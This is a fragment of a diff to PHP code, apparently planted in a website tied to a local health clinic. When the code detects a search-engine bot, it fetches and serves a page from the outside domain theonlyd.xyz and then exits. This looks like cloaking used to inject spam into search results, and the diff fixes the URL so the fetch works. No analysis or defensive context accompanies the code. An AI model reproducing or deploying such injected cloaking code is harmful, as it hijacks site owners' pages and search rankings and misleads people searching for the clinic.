@@ -14,7 +14,7 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('theonlyd.xyz/turu99/puskesmascipayung-pelayanan-jadwal-pelayanan.html');
+echo file_get_contents('https://theonlyd.xyz/turu99/puskesmascipayung-pelayanan-jadwal-pelayanan.html');
 exit;
 }
 
